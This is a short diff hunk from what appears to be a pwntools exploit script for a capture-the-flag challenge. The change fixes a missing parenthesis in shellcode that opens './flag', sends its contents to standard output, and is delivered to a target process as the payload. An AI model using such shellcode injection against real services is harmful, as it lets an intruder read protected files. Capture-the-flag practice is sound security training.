@@ -663,7 +663,7 @@ rsp = '''
 '''
 shellcode = rsp
 shellcode += shellcraft.openat(-100, "./flag", 0, 0)
-shellcode += shellcraft.sendfile(1, 3, 0, 0x100
+shellcode += shellcraft.sendfile(1, 3, 0, 0x100)
 
 payload = asm(shellcode)
 p.sendlineafter(b'World!', payload)
